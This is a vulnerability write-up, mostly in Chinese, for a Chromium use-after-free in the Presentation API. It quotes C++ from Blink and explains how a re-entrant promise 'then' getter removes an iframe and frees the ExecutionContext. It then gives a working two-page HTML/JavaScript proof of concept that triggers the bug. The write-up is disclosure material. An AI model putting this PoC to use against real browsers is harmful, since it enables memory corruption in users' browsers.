https://bugs.chromium.org/p/chromium/issues/detail?id=1116706

### Root case
```c++
  void PresentationConnectionCallbacks::OnSuccess(
      const mojom::blink::PresentationInfo& presentation_info,
      mojo::PendingRemote<mojom::blink::PresentationConnection> connection_remote,
      mojo::PendingReceiver<mojom::blink::PresentationConnection>
          connection_receiver) {
    // Reconnect to existing connection.
    if (connection_ && connection_->GetState() ==
                           mojom::blink::PresentationConnectionState::CLOSED) {
      connection_->DidChangeState(
          mojom::blink::PresentationConnectionState::CONNECTING);
    }
  
    // Create a new connection.
    if (!connection_ && request_) {
      connection_ = ControllerPresentationConnection::Take(
          resolver_.Get(), presentation_info, request_);
    }
  
    resolver_->Resolve(connection_); //***1***
    connection_->Init(std::move(connection_remote),
                      std::move(connection_receiver));
  }
```

我们先从connection_的构造开始看起，在创建的过程中ControllerPresentationConnection保存了PresentationController* controller
```
connection_ = ControllerPresentationConnection::Take(
    resolver_.Get(), presentation_info, request_);


ControllerPresentationConnection* ControllerPresentationConnection::Take(
    ScriptPromiseResolver* resolver,
    const mojom::blink::PresentationInfo& presentation_info,
    PresentationRequest* request) {
  DCHECK(resolver);
  DCHECK(request);

  PresentationController* controller =
      PresentationController::FromContext(resolver->GetExecutionContext());
  if (!controller)
    return nullptr;

  return Take(controller, presentation_info, request);
}


class MODULES_EXPORT ControllerPresentationConnection final
    : public PresentationConnection {
 public:
  
[............]

 private:
  // PresentationConnection implementation.
  void CloseInternal() override;
  void TerminateInternal() override;

  Member<PresentationController> controller_;
};
```

在resolver\_->Resolve(connection_);处可以通过重入js的方式通过remove iframe来使得controller被析构，同样的ExecutionContext也将被析构

之后调用init：
```
void ControllerPresentationConnection::Init(
    mojo::PendingRemote<mojom::blink::PresentationConnection> connection_remote,
    mojo::PendingReceiver<mojom::blink::PresentationConnection>
        connection_receiver) {
  // Note that it is possible for the binding to be already bound here, because
  // the ControllerPresentationConnection object could be reused when
  // reconnecting in the same frame. In this case the existing connections are
  // discarded.
  if (connection_receiver_.is_bound()) {
    connection_receiver_.reset();
    target_connection_.reset();
  }

  DidChangeState(mojom::blink::PresentationConnectionState::CONNECTING);
  target_connection_.Bind(
      std::move(connection_remote),
      GetExecutionContext()->GetTaskRunner(blink::TaskType::kPresentation));
  connection_receiver_.Bind(
      std::move(connection_receiver),
      GetExecutionContext()->GetTaskRunner(blink::TaskType::kPresentation));
}
```

GetExecutionContext()->GetTaskRunner将会导致uaf产生。


### poc

```
<html>
    <head>
        <script>
            function createIframe(){
                let iframe = document.createElement("iframe");
                iframe.setAttribute("id", "ifm");
                iframe.src="presentation-2.html";
                document.body.appendChild(iframe);
            }
            function remove(){
                let frame = document.getElementById("ifm");
                frame.parentNode.removeChild(frame);
            }
        </script>
    </head>
    <body onload="createIframe()">

    </body>
</html>
```

```
<html>
    <head>
        <script>
                Object.prototype.__defineGetter__("then", function() {
                        parent.remove();
                        gc();
                });

                function start(){
                    request = new PresentationRequest([location]);
                    request.start().then(
                        connection=>{
                            console.log(2);
                        }
                    );
                }

                function gc(){
                    for(let i = 0; i < 0x20; i++){
                        try{ new ArrayBuffer(0x1000000);}catch(e){};
                    }
                }
                
            
        </script>
    </head>
    <body>
        <button onclick="start()">Click me</button>
    </body>
</html>
```